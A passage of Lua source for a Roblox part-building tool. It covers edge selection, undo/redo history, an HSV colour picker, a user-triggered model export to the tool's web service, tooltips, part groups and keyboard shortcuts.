			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( -size_x, -size_y, -size_z ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( size_x, size_y, 0 ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( size_x, 0, size_z ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( 0, size_y, size_z ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( size_x, 0, 0 ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( 0, size_y, 0 ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( 0, 0, size_z ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( -size_x, size_y, 0 ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( -size_x, 0, size_z ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( 0, -size_y, size_z ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( -size_x, 0, 0 ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( 0, -size_y, 0 ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( 0, 0, -size_z ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( size_x, -size_y, 0 ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( size_x, 0, -size_z ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( 0, size_y, -size_z ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( -size_x, -size_y, 0 ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( -size_x, 0, -size_z ) ) );
			table_insert( edges, partCFrameOffset( PartCFrame, newCFrame( 0, -size_y, -size_z ) ) );

			-- Calculate the proximity of every edge to the mouse
			for edge_index, Edge in pairs( edges ) do
				Proximity[edge_index] = ( Mouse.Hit.p - Edge.p ).magnitude;
			end;

			-- Get the closest edge to the mouse
			local highest_proximity = 1;
			for proximity_index, proximity in pairs( Proximity ) do
				if proximity < Proximity[highest_proximity] then
					highest_proximity = proximity_index;
				end;
			end;

			-- Replace the current target edge (if any)
			local ClosestEdge = edges[highest_proximity];

			if self.Marker then
				self.Marker:Destroy();
			end;
			self.Marker = RbxUtility.Create "Part" {
				Name = "BTEdgeSelectionMarker";
				Anchored = true;
				Locked = true;
				CanCollide = false;
				Transparency = 1;
				FormFactor = Enum.FormFactor.Custom;
				Size = Vector3.new( 0.2, 0.2, 0.2 );
				CFrame = ClosestEdge;
			};

			self.MarkerOutline.Adornee = self.Marker;

		end );

		self.Connections.ClickListener = Mouse.Button1Up:connect( function ()
			override_selection = true;
			self:select( edgeSelectionCallback );
		end );

		self.enabled = true;

	end;

	["select"] = function ( self, callback )

		if not self.enabled or not self.Marker then
			return;
		end;

		self.MarkerOutline.Adornee = self.Marker;

		callback( self.Marker );

		-- Stop treating it like a marker
		self.Marker = nil;

		self:disable();

	end;

	["disable"] = function ( self )

		if not self.enabled then
			return;
		end;

		-- Disconnect unnecessary temporary connections
		if self.Connections.ClickListener then
			self.Connections.ClickListener:disconnect();
			self.Connections.ClickListener = nil;
		end;
		if self.Connections.MoveListener then
			self.Connections.MoveListener:disconnect();
			self.Connections.MoveListener = nil;
		end;

		-- Remove temporary objects
		if self.Marker then
			self.Marker:Destroy();
		end;
		self.Marker = nil;

		self.MarkerOutline.Adornee = nil;
		self.enabled = false;

	end;

	["stop"] = function ( self )

		if not self.started then
			return;
		end;

		-- Cancel any ongoing selection
		self:disable();

		-- Disconnect & remove all temporary connections
		for connection_index, Connection in pairs( self.Connections ) do
			Connection:disconnect();
			self.Connections[connection_index] = nil;
		end;

		-- Remove temporary objects
		if self.Marker then
			self.Marker:Destroy();
		end;

		self.started = false;

	end;

};

------------------------------------------
-- Provide an interface to the history
-- system
------------------------------------------
History = {

	-- Keep a container for the actual history data
	["Data"] = {};

	-- Keep state data
	["index"] = 0;

	-- Provide events for the platform to listen for changes
	["Changed"] = RbxUtility.CreateSignal();

	-- Provide functions to control the system
	["undo"] = function ( self )

		-- Make sure we're not getting out of boundary
		if self.index - 1 < 0 then
			return;
		end;

		-- Fetch the history record & unapply it
		local CurrentRecord = self.Data[self.index];
		CurrentRecord:unapply();

		-- Go back in the history
		self.index = self.index - 1;

		-- Fire the relevant events
		self.Changed:fire();

	end;

	["redo"] = function ( self )

		-- Make sure we're not getting out of boundary
		if self.index + 1 > #self.Data then
			return;
		end;

		-- Go forward in the history
		self.index = self.index + 1;

		-- Fetch the new history record & apply it
		local NewRecord = self.Data[self.index];
		NewRecord:apply();

		-- Fire the relevant events
		self.Changed:fire();

	end;

	["add"] = function ( self, Record )

		-- Place the record in its right spot
		self.Data[self.index + 1] = Record;

		-- Advance the history index
		self.index = self.index + 1;

		-- Clear out the following history
		for index = self.index + 1, #self.Data do
			self.Data[index] = nil;
		end;

		-- Fire the relevant events
		self.Changed:fire();

	end;

};


------------------------------------------
-- Provide an interface color picker
-- system
------------------------------------------
ColorPicker = {
	
	-- Keep some state data
	["enabled"] = false;
	["callback"] = nil;
	["track_mouse"] = nil;
	["hue"] = 0;
	["saturation"] = 1;
	["value"] = 1;

	-- Keep the current GUI here
	["GUI"] = nil;

	-- Keep temporary, disposable connections here
	["Connections"] = {};

	-- Provide an interface to the functions
	["start"] = function ( self, callback, start_color )

		-- Replace any existing color pickers
		if self.enabled then
			self:cancel();
		end;
		self.enabled = true;

		-- Create the GUI
		self.GUI = Tool.Interfaces.BTHSVColorPicker:Clone();
		self.GUI.Parent = UI;

		-- Register the callback function for when we're done here
		self.callback = callback;

		-- Update the GUI
		local start_color = start_color or Color3.new( 1, 0, 0 );
		self:_changeColor( _RGBToHSV( start_color.r, start_color.g, start_color.b ) );

		-- Add functionality to the GUI's interactive elements
		table.insert( self.Connections, self.GUI.HueSaturation.MouseButton1Down:connect( function ( x, y )
			self.track_mouse = 'hue-saturation';
			self:_onMouseMove( x, y );
		end ) );

		table.insert( self.Connections, self.GUI.HueSaturation.MouseButton1Up:connect( function ()
			self.track_mouse = nil;
		end ) );

		table.insert( self.Connections, self.GUI.MouseMoved:connect( function ( x, y )
			self:_onMouseMove( x, y );
		end ) );

		table.insert( self.Connections, self.GUI.Value.MouseButton1Down:connect( function ( x, y )
			self.track_mouse = 'value';
			self:_onMouseMove( x, y );
		end ) );

		table.insert( self.Connections, self.GUI.Value.MouseButton1Up:connect( function ()
			self.track_mouse = nil;
		end ) );

		table.insert( self.Connections, self.GUI.OkButton.MouseButton1Up:connect( function ()
			self:finish();
		end ) );

		table.insert( self.Connections, self.GUI.CancelButton.MouseButton1Up:connect( function ()
			self:cancel();
		end ) );

		table.insert( self.Connections, self.GUI.HueOption.Input.TextButton.MouseButton1Down:connect( function ()
			self.GUI.HueOption.Input.TextBox:CaptureFocus();
		end ) );
		table.insert( self.Connections, self.GUI.HueOption.Input.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( self.GUI.HueOption.Input.TextBox.Text );
			if potential_new then
				if potential_new > 360 then
					potential_new = 360;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:_changeColor( potential_new, self.saturation, self.value );
			else
				self:_updateGUI();
			end;
		end ) );

		table.insert( self.Connections, self.GUI.SaturationOption.Input.TextButton.MouseButton1Down:connect( function ()
			self.GUI.SaturationOption.Input.TextBox:CaptureFocus();
		end ) );
		table.insert( self.Connections, self.GUI.SaturationOption.Input.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( ( self.GUI.SaturationOption.Input.TextBox.Text:gsub( '%%', '' ) ) );
			if potential_new then
				if potential_new > 100 then
					potential_new = 100;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:_changeColor( self.hue, potential_new / 100, self.value );
			else
				self:_updateGUI();
			end;
		end ) );

		table.insert( self.Connections, self.GUI.ValueOption.Input.TextButton.MouseButton1Down:connect( function ()
			self.GUI.ValueOption.Input.TextBox:CaptureFocus();
		end ) );
		table.insert( self.Connections, self.GUI.ValueOption.Input.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( ( self.GUI.ValueOption.Input.TextBox.Text:gsub( '%%', '' ) ) );
			if potential_new then
				if potential_new < 0 then
					potential_new = 0;
				elseif potential_new > 100 then
					potential_new = 100;
				end;
				self:_changeColor( self.hue, self.saturation, potential_new / 100 );
			else
				self:_updateGUI();
			end;
		end ) );

	end;

	["_onMouseMove"] = function ( self, x, y )
		if not self.track_mouse then
			return;
		end;

		if self.track_mouse == 'hue-saturation' then
			-- Calculate the mouse position relative to the graph
			local graph_x, graph_y = x - self.GUI.HueSaturation.AbsolutePosition.x, y - self.GUI.HueSaturation.AbsolutePosition.y;

			-- Make sure we're not going out of bounds
			if graph_x < 0 then
				graph_x = 0;
			elseif graph_x > self.GUI.HueSaturation.AbsoluteSize.x then
				graph_x = self.GUI.HueSaturation.AbsoluteSize.x;
			end;
			if graph_y < 0 then
				graph_y = 0;
			elseif graph_y > self.GUI.HueSaturation.AbsoluteSize.y then
				graph_y = self.GUI.HueSaturation.AbsoluteSize.y;
			end;

			-- Calculate the new color and change it
			self:_changeColor( 359 * graph_x / 209, 1 - graph_y / 200, self.value );

		elseif self.track_mouse == 'value' then
			-- Calculate the mouse position relative to the value bar
			local bar_y = y - self.GUI.Value.AbsolutePosition.y;

			-- Make sure we're not going out of bounds
			if bar_y < 0 then
				bar_y = 0;
			elseif bar_y > self.GUI.Value.AbsoluteSize.y then
				bar_y = self.GUI.Value.AbsoluteSize.y;
			end;

			-- Calculate the new color and change it
			self:_changeColor( self.hue, self.saturation, 1 - bar_y / 200 );
		end;
	end;

	["_changeColor"] = function ( self, hue, saturation, value )
		if hue ~= hue then
			hue = 359;
		end;
		self.hue = hue;
		self.saturation = saturation == 0 and 0.01 or saturation;
		self.value = value;
		self:_updateGUI();
	end;

	["_updateGUI"] = function ( self )

		self.GUI.HueSaturation.Cursor.Position = UDim2.new( 0, 209 * self.hue / 360 - 8, 0, ( 1 - self.saturation ) * 200 - 8 );
		self.GUI.Value.Cursor.Position = UDim2.new( 0, -2, 0, ( 1 - self.value ) * 200 - 8 );

		local color = Color3.new( _HSVToRGB( self.hue, self.saturation, self.value ) );
		self.GUI.ColorDisplay.BackgroundColor3 = color;
		self.GUI.Value.ColorBG.BackgroundColor3 = Color3.new( _HSVToRGB( self.hue, self.saturation, 1 ) );

		self.GUI.HueOption.Bar.BackgroundColor3 = color;
		self.GUI.SaturationOption.Bar.BackgroundColor3 = color;
		self.GUI.ValueOption.Bar.BackgroundColor3 = color;

		self.GUI.HueOption.Input.TextBox.Text = math.floor( self.hue );
		self.GUI.SaturationOption.Input.TextBox.Text = math.floor( self.saturation * 100 ) .. "%";
		self.GUI.ValueOption.Input.TextBox.Text = math.floor( self.value * 100 ) .. "%";

	end;

	["finish"] = function ( self )

		if not self.enabled then
			return;
		end;

		-- Remove the GUI
		if self.GUI then
			self.GUI:Destroy();
		end;
		self.GUI = nil;
		self.track_mouse = nil;

		-- Disconnect all temporary connections
		for connection_index, connection in pairs( self.Connections ) do
			connection:disconnect();
			self.Connections[connection_index] = nil;
		end;

		-- Call the callback function that was provided to us
		self.callback( self.hue, self.saturation, self.value );
		self.callback = nil;

		self.enabled = false;

	end;

	["cancel"] = function ( self )

		if not self.enabled then
			return;
		end;

		-- Remove the GUI
		if self.GUI then
			self.GUI:Destroy();
		end;
		self.GUI = nil;
		self.track_mouse = nil;

		-- Disconnect all temporary connections
		for connection_index, connection in pairs( self.Connections ) do
			connection:disconnect();
			self.Connections[connection_index] = nil;
		end;

		-- Call the callback function that was provided to us
		self.callback();
		self.callback = nil;

		self.enabled = false;

	end;

};

------------------------------------------
-- Provide an interface to the
-- import/export system
------------------------------------------
IE = {

	["export"] = function ()

		if #Selection.Items == 0 then
			return;
		end;

		local serialized_selection = _serializeParts( Selection.Items );

		-- Dump to logs
		-- Services.TestService:Warn( false, "[Building Tools by F3X] Exported Model: \n" .. serialized_selection );

		-- Get ready to upload to the web for retrieval
		local upload_data;
		local cancelUpload;

		-- Create the export dialog
		local Dialog = Tool.Interfaces.BTExportDialog:Clone();
		Dialog.Loading.Size = UDim2.new( 1, 0, 0, 0 );
		Dialog.Parent = UI;
		Dialog.Loading:TweenSize( UDim2.new( 1, 0, 0, 80 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.25 );
		Dialog.Loading.CloseButton.MouseButton1Up:connect( function ()
			cancelUpload();
			Dialog:Destroy();
		end );

		-- Run the upload/post-upload/failure code in a coroutine
		-- so it can be cancelled
		coroutine.resume( coroutine.create( function ()
			cancelUpload = function ()
				coroutine.yield();
			end;
			local upload_attempt = ypcall( function ()
				upload_data = Tool.HttpInterface.PostAsync:InvokeServer( "http://www.f3xteam.com/bt/export", serialized_selection );
			end );

			-- Fail graciously
			if not upload_attempt then
				Dialog.Loading.TextLabel.Text = "Upload failed";
				Dialog.Loading.CloseButton.Text = 'Ok :(';
				return;
			end;
			if not ( upload_data and type( upload_data ) == 'string' and upload_data:len() > 0 ) then
				Dialog.Loading.TextLabel.Text = "Upload failed";
				Dialog.Loading.CloseButton.Text = 'Ok ;(';
				return;
			end;
			if not pcall( function () upload_data = RbxUtility.DecodeJSON( upload_data ); end ) or not upload_data then
				Dialog.Loading.TextLabel.Text = "Upload failed";
				Dialog.Loading.CloseButton.Text = "Ok :'(";
				return;
			end;
			if not upload_data.success then
				Dialog.Loading.TextLabel.Text = "Upload failed";
				Dialog.Loading.CloseButton.Text = "Ok :''(";
			end;

			print( "[Building Tools by F3X] Uploaded Export: " .. upload_data.id );

			Dialog.Loading.Visible = false;
			Dialog.Info.Size = UDim2.new( 1, 0, 0, 0 );
			Dialog.Info.CreationID.Text = upload_data.id;
			Dialog.Info.Visible = true;
			Dialog.Info:TweenSize( UDim2.new( 1, 0, 0, 75 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.25 );
			Dialog.Tip.Size = UDim2.new( 1, 0, 0, 0 );
			Dialog.Tip.Visible = true;
			Dialog.Tip:TweenSize( UDim2.new( 1, 0, 0, 30 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.25 );
			Dialog.Close.Size = UDim2.new( 1, 0, 0, 0 );
			Dialog.Close.Visible = true;
			Dialog.Close:TweenSize( UDim2.new( 1, 0, 0, 20 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.25 );
			Dialog.Close.Button.MouseButton1Up:connect( function ()
				Dialog:Destroy();
			end );

			-- Play a confirmation sound
			local Sound = RbxUtility.Create "Sound" {
				Name = "BTActionCompletionSound";
				Pitch = 1.5;
				SoundId = Assets.ActionCompletionSound;
				Volume = 1;
				Parent = Player or Services.SoundService;
			};
			Sound:Play();
			Sound:Destroy();
		end ) );

	end;

};

------------------------------------------
-- Prepare the dock UI
------------------------------------------

Tooltips = {};

-- Create the main GUI
Dock = Tool.Interfaces.BTDockGUI:Clone();
Dock.Parent = UI;
Dock.Visible = false;

-- Add functionality to each tool button
function RegisterToolButton( ToolButton )
	-- Provides functionality to `ToolButton`

	-- Get the tool name and the tool
	local tool_name = ToolButton.Name:match( "(.+)Button" );

	if tool_name then

		-- Create the click connection
		ToolButton.MouseButton1Up:connect( function ()
			local Tool = Tools[tool_name];
			if Tool then
				equipTool( Tool );
			end;
		end );

		ToolButton.MouseEnter:connect( function ()
			local Tooltip = Tooltips[tool_name];
			if Tooltip then
				Tooltip:focus( 'button' );
			end;
		end );

		ToolButton.MouseLeave:connect( function ()
			local Tooltip = Tooltips[tool_name];
			if Tooltip then
				Tooltip:unfocus( 'button' );
			end;
		end );

	end;
end;
for _, ToolButton in pairs( Dock.ToolButtons:GetChildren() ) do
	RegisterToolButton( ToolButton );
end;

-- Prepare the tooltips
function RegisterTooltip( Tooltip )
	local tool_name = Tooltip.Name:match( "(.+)Info" );

	Tooltips[tool_name] = {

		GUI = Tooltip;

		button_focus = false;
		tooltip_focus = false;

		focus = function ( self, source )
			if Dock.HelpInfo.Visible then
				return;
			end;
			if source == 'button' then
				self.button_focus = true;
			elseif source == 'tooltip' then
				self.tooltip_focus = true;
			end;
			for _, Tooltip in pairs( Dock.Tooltips:GetChildren() ) do
				Tooltip.Visible = false;
			end;
			self.GUI.Visible = true;
		end;

		unfocus = function ( self, source )
			if source == 'button' then
				self.button_focus = false;
			elseif source == 'tooltip' then
				self.tooltip_focus = false;
			end;
			if not self.button_focus and not self.tooltip_focus then
				self.GUI.Visible = false;
			end;
		end;

	};

	-- Make it disappear after it's out of mouse focus
	Tooltip.MouseEnter:connect( function ()
		Tooltips[tool_name]:focus( 'tooltip' );
	end );
	Tooltip.MouseLeave:connect( function ()
		Tooltips[tool_name]:unfocus( 'tooltip' );
	end );

	-- Create the scrolling container
	local ScrollingContainer = Gloo.ScrollingContainer( true, false, 15 );
	ScrollingContainer.GUI.Parent = Tooltip;

	-- Put the tooltip content in the container
	for _, Child in pairs( Tooltip.Content:GetChildren() ) do
		Child.Parent = ScrollingContainer.Container;
	end;
	ScrollingContainer.GUI.Size = Dock.Tooltips.Size;
	ScrollingContainer.Container.Size = Tooltip.Content.Size;
	ScrollingContainer.Boundary.Size = Dock.Tooltips.Size;
	ScrollingContainer.Boundary.BackgroundTransparency = 1;
	Tooltip.Content:Destroy();

end;
for _, Tooltip in pairs( Dock.Tooltips:GetChildren() ) do
	RegisterTooltip( Tooltip );
end;

-- Create the scrolling container for the help tooltip
local ScrollingContainer = Gloo.ScrollingContainer( true, false, 15 );
ScrollingContainer.GUI.Parent = Dock.HelpInfo;

-- Put the help tooltip content in the container
for _, Child in pairs( Dock.HelpInfo.Content:GetChildren() ) do
	Child.Parent = ScrollingContainer.Container;
end;
ScrollingContainer.GUI.Size = Dock.HelpInfo.Size;
ScrollingContainer.Container.Size = Dock.HelpInfo.Content.Size;
ScrollingContainer.Boundary.Size = Dock.HelpInfo.Size;
ScrollingContainer.Boundary.BackgroundTransparency = 1;
Dock.HelpInfo.Content:Destroy();

-- Add functionality to the other GUI buttons
Dock.SelectionButtons.UndoButton.MouseButton1Up:connect( function ()
	History:undo();
end );
Dock.SelectionButtons.RedoButton.MouseButton1Up:connect( function ()
	History:redo();
end );
Dock.SelectionButtons.DeleteButton.MouseButton1Up:connect( function ()
	deleteSelection();
end );
Dock.SelectionButtons.CloneButton.MouseButton1Up:connect( function ()
	cloneSelection();
end );
Dock.SelectionButtons.ExportButton.MouseButton1Up:connect( function ()
	IE:export();
end );
Dock.SelectionButtons.GroupsButton.MouseButton1Up:connect( function ()
	Groups:ToggleUI();
end );
Dock.InfoButtons.HelpButton.MouseButton1Up:connect( function ()
	toggleHelp();
end );

-- Shade the buttons according to whether they'll function or not
Selection.Changed:connect( function ()

	-- If there are items, they should be active
	if #Selection.Items > 0 then
		Dock.SelectionButtons.DeleteButton.Image = Assets.DeleteActiveDecal;
		Dock.SelectionButtons.CloneButton.Image = Assets.CloneActiveDecal;
		Dock.SelectionButtons.ExportButton.Image = Assets.ExportActiveDecal;

	-- If there aren't items, they shouldn't be active
	else
		Dock.SelectionButtons.DeleteButton.Image = Assets.DeleteInactiveDecal;
		Dock.SelectionButtons.CloneButton.Image = Assets.CloneInactiveDecal;
		Dock.SelectionButtons.ExportButton.Image = Assets.ExportInactiveDecal;
	end;

end );

-- Make the selection/info buttons display tooltips upon hovering over them
for _, SelectionButton in pairs( Dock.SelectionButtons:GetChildren() ) do
	SelectionButton.MouseEnter:connect( function ()
		if SelectionButton:FindFirstChild( 'Tooltip' ) then
			SelectionButton.Tooltip.Visible = true;
		end;
	end );
	SelectionButton.MouseLeave:connect( function ()
		if SelectionButton:FindFirstChild( 'Tooltip' ) then
			SelectionButton.Tooltip.Visible = false;
		end;
	end );
end;
Dock.InfoButtons.HelpButton.MouseEnter:connect( function ()
	Dock.InfoButtons.HelpButton.Tooltip.Visible = true;
end );
Dock.InfoButtons.HelpButton.MouseLeave:connect( function ()
	Dock.InfoButtons.HelpButton.Tooltip.Visible = false;
end );

History.Changed:connect( function ()

	-- If there are any records
	if #History.Data > 0 then

		-- If we're at the beginning
		if History.index == 0 then
			Dock.SelectionButtons.UndoButton.Image = Assets.UndoInactiveDecal;
			Dock.SelectionButtons.RedoButton.Image = Assets.RedoActiveDecal;

		-- If we're at the end
		elseif History.index == #History.Data then
			Dock.SelectionButtons.UndoButton.Image = Assets.UndoActiveDecal;
			Dock.SelectionButtons.RedoButton.Image = Assets.RedoInactiveDecal;

		-- If we're neither at the beginning or the end
		else
			Dock.SelectionButtons.UndoButton.Image = Assets.UndoActiveDecal;
			Dock.SelectionButtons.RedoButton.Image = Assets.RedoActiveDecal;
		end;

	-- If there are no records
	else
		Dock.SelectionButtons.UndoButton.Image = Assets.UndoInactiveDecal;
		Dock.SelectionButtons.RedoButton.Image = Assets.RedoInactiveDecal;
	end;

end );

------------------------------------------
-- An interface for the group system
------------------------------------------
Groups = {

	-- A container for the groups
	Data = {};

	-- Create the group manager UI
	UI = Tool.Interfaces.BTGroupsGUI:Clone();

	-- Provide an event to track new groups
	GroupAdded = CreateSignal();

	NewGroup = function ( Groups )
		local Group = {
			Name		= 'Group ' .. ( #Groups.Data + 1 );
			Items		= {};
			Ignoring	= false;
			Changed		= CreateSignal();
			Updated		= CreateSignal();

			Rename = function ( Group, NewName )
				Group.Name = NewName;
				Group.Changed:Fire();
			end;

			SetIgnore = function ( Group, NewIgnoringStatus )
				Group.Ignoring = NewIgnoringStatus;
				Group.Changed:Fire();
			end;

			Update = function ( Group, NewItems )
				-- Set the new items
				Group.Items = _cloneTable( NewItems );
				Group.Updated:Fire();
			end;

			Select = function ( Group, Multiselecting )
				if not Multiselecting then
					Selection:clear();
				end;
				for _, Item in pairs( Group.Items ) do
					Selection:add( Item );
				end;
			end;
		};
		table.insert( Groups.Data, Group );
		Groups.GroupAdded:Fire( Group );
		return Group;
	end;

	ToggleUI = function ( Groups )
		Groups.UI.Visible = not Groups.UI.Visible;
	end;

	IsPartIgnored = function ( Groups, Part )
		-- Returns whether `Part` should be ignored in selection

		-- Check for any groups that ignore their parts and if `Part` is in any of them
		for _, Group in pairs( Groups.Data ) do
			if Group.Ignoring and #_findTableOccurrences( Group.Items, Part ) > 0 then
				return true;
			end;
		end;

		-- If no groups come up, it's not an ignored part
		return false;
	end;
};

-- Add the group manager UI to the main UI
Groups.UI.Visible = false;
Groups.UI.Parent = Dock;

-- Prepare the functionality of the group manager UI
Groups.UI.Title.CreateButton.MouseButton1Click:connect( function ()
	local Group = Groups:NewGroup();
	Group:Update( Selection.Items );
end );

Groups.GroupAdded:Connect( function ( Group )
	local GroupButton			= Groups.UI.Templates.GroupButton:Clone();
	GroupButton.Position		= UDim2.new( 0, 0, 0, 26 * #Groups.UI.GroupList:GetChildren() );
	GroupButton.Parent			= Groups.UI.GroupList;
	GroupButton.GroupName.Text	= Group.Name;
	GroupButton.GroupNamer.Text	= Group.Name;

	Groups.UI.GroupList.CanvasSize = UDim2.new( 1, -10, 0, 26 * #Groups.UI.GroupList:GetChildren() );

	-- Adjust the tooltip caption on the ignore button
	GroupButton.IgnoreButton.RightTooltip.Text.Text = Group.Ignoring and 'UNIGNORE' or 'IGNORE';

	GroupButton.GroupName.MouseButton1Click:connect( function ()
		Group:Select( ActiveKeys[47] or ActiveKeys[48] );
	end );

	Group.Changed:Connect( function ()
		GroupButton.GroupName.Text		= Group.Name;
		GroupButton.GroupNamer.Text		= Group.Name;
		GroupButton.IgnoreButton.Image	= Group.Ignoring and Assets.GroupLockIcon or Assets.GroupUnlockIcon;

		-- Change the tooltip caption on the ignore button
		GroupButton.IgnoreButton.RightTooltip.Text.Text = Group.Ignoring and 'UNIGNORE' or 'IGNORE';
	end );

	Group.Updated:connect( function ()
		GroupButton.UpdateButton.Image = Assets.GroupUpdateOKIcon;
		coroutine.wrap( function()
			wait( 1 );
			GroupButton.UpdateButton.Image = Assets.GroupUpdateIcon;
		end )();
	end );

	GroupButton.EditButton.MouseButton1Click:connect( function ()
		GroupButton.GroupName.Visible	= false;
		GroupButton.GroupNamer.Visible	= true;
		GroupButton.GroupNamer:CaptureFocus();
	end );

	GroupButton.GroupNamer.FocusLost:connect( function ( EnterPressed )
		if EnterPressed then
			Group:Rename( GroupButton.GroupNamer.Text );
		end;
		GroupButton.GroupNamer.Visible	= false;
		GroupButton.GroupNamer.Text		= Group.Name;
		GroupButton.GroupName.Visible	= true;
	end );

	-- Toggle ignoring when the ignore button is clicked
	GroupButton.IgnoreButton.MouseButton1Click:connect( function ()
		Group:SetIgnore( not Group.Ignoring );
	end );

	GroupButton.UpdateButton.MouseButton1Click:connect( function ()
		Group:Update( Selection.Items );
	end );

	-- Pop up tooltips when the buttons are hovered over
	local ButtonsWithTooltips = { GroupButton.UpdateButton, GroupButton.EditButton, GroupButton.IgnoreButton, GroupButton.GroupNameArea };
	for _, Button in pairs( ButtonsWithTooltips ) do
		local Tooltip = Button:FindFirstChild 'LeftTooltip' or Button:FindFirstChild 'RightTooltip';
		if Tooltip then
			Button.InputBegan:connect( function ( InputData )
				if InputData.UserInputType == Enum.UserInputType.MouseMovement then
					Tooltip.Visible = true;
				end;
			end );
			Button.InputEnded:connect( function ( InputData )
				if InputData.UserInputType == Enum.UserInputType.MouseMovement then
					Tooltip.Visible = false;
				end;
			end );
		end;
	end;
end );

------------------------------------------
-- Attach tool event listeners
------------------------------------------

function equipBT( CurrentMouse )

	Mouse = CurrentMouse;

	-- Enable the move tool if there's no tool currently enabled
	if not CurrentTool then
		equipTool( Tools.Move );
	end;

	if not TargetBox then
		TargetBox = Instance.new( "SelectionBox", UI );
		TargetBox.Name = "BTTargetBox";
		TargetBox.Color = BrickColor.new( "Institutional white" );
		TargetBox.Transparency = 0.5;
	end;

	-- Enable any temporarily-disabled selection boxes
	for _, SelectionBox in pairs( SelectionBoxes ) do
		SelectionBox.Parent = UI;
	end;

	-- Update the internal selection if this is a plugin
	if ToolType == 'plugin' then
		for _, Item in pairs( Services.Selection:Get() ) do
			Selection:add( Item );
		end;
	end;

	-- Call the `Equipped` listener of the current tool
	if CurrentTool and CurrentTool.Listeners.Equipped then
		CurrentTool.Listeners.Equipped();
	end;

	-- Show the dock
	Dock.Visible = true;

	-- Display any startup notifications
	coroutine.wrap( ShowStartupNotifications )();

	table.insert( Connections, Mouse.KeyDown:connect( function ( key )

		local key = key:lower();
		local key_code = key:byte();

		-- Provide the abiltiy to delete via the shift + X key combination
		if ActiveKeys[47] or ActiveKeys[48] and key == "x" then
			deleteSelection();
			return;
		end;

		-- Provide the ability to clone via the shift + C key combination
		if ActiveKeys[47] or ActiveKeys[48] and key == "c" then
			cloneSelection();
			return;
		end;

		-- Undo if shift+z is pressed
		if key == "z" and ( ActiveKeys[47] or ActiveKeys[48] ) then
			History:undo();
			return;

		-- Redo if shift+y is pressed
		elseif key == "y" and ( ActiveKeys[47] or ActiveKeys[48] ) then
			History:redo();
			return;
		end;

		-- Serialize and dump selection to logs if shift+p is pressed
		if key == "p" and ( ActiveKeys[47] or ActiveKeys[48] ) then
			IE:export();
			return;
		end;

		-- Perform a prism selection if shift + k is pressed
		if key == "k" and ( ActiveKeys[47] or ActiveKeys[48] ) then
			prismSelect();
			return;
		end;

		-- Clear the selection if shift + r is pressed
		if key == "r" and ( ActiveKeys[47] or ActiveKeys[48] ) then
			Selection:clear();
			return;
		end;

		if key == "g" and ( ActiveKeys[47] or ActiveKeys[48] ) then
			Groups:ToggleUI();
			return;
		end;

		if key == "z" then
			equipTool( Tools.Move );

		elseif key == "x" then
			equipTool( Tools.Resize );

		elseif key == "c" then
			equipTool( Tools.Rotate );

		elseif key == "v" then
			equipTool( Tools.Paint );

		elseif key == "b" then
			equipTool( Tools.Surface );

		elseif key == "n" then
			equipTool( Tools.Material );

		elseif key == "m" then
			equipTool( Tools.Anchor );

		elseif key == "k" then
			equipTool( Tools.Collision );

		elseif key == "j" then
			equipTool( Tools.NewPart );

		elseif key == "h" then
			equipTool( Tools.Mesh );

		elseif key == "g" then
			equipTool( Tools.Texture );

		elseif key == "f" then
			equipTool( Tools.Weld );

		elseif key == "u" then
			equipTool( Tools.Lighting );

		elseif key == "p" then
			equipTool( Tools.Decorate );

		end;

		ActiveKeys[key_code] = key_code;
		ActiveKeys[key] = key;

		-- If it's now in multiselection mode, update `selecting`
		-- (these are the left/right ctrl & shift keys)
		if ActiveKeys[47] or ActiveKeys[48] or ActiveKeys[49] or ActiveKeys[50] then
			selecting = ActiveKeys[47] or ActiveKeys[48] or ActiveKeys[49] or ActiveKeys[50];
		end;

	end ) );

	table.insert( Connections, Mouse.KeyUp:connect( function ( key )

		local key = key:lower();
		local key_code = key:byte();

		ActiveKeys[key_code] = nil;
		ActiveKeys[key] = nil;

		-- If it's no longer in multiselection mode, update `selecting` & related values
		if selecting and not ActiveKeys[selecting] then
			selecting = false;
			if Select2D.enabled then
				Select2D:select();
				Select2D:finish();
			end;
		end;

		-- Fire tool listeners
		if CurrentTool and CurrentTool.Listeners.KeyUp then
			CurrentTool.Listeners.KeyUp( key );
		end;

	end ) );

	table.insert( Connections, Services.UserInputService.InputEnded:connect( function ( InputData )

		if InputData.UserInputType == Enum.UserInputType.MouseButton1 then
			clicking = false;

			-- Finish any ongoing 2D selection wherever the left mouse button is released
			if Select2D.enabled then
				Select2D:select();
				Select2D:finish();
			end;
		end;

	end ) );

	table.insert( Connections, Mouse.Button1Down:connect( function ()

		clicking = true;
		click_x, click_y = Mouse.X, Mouse.Y;

		-- If multiselection is, just add to the selection
		if selecting then
			return;
		end;

		-- Fire tool listeners
		if CurrentTool and CurrentTool.Listeners.Button1Down then
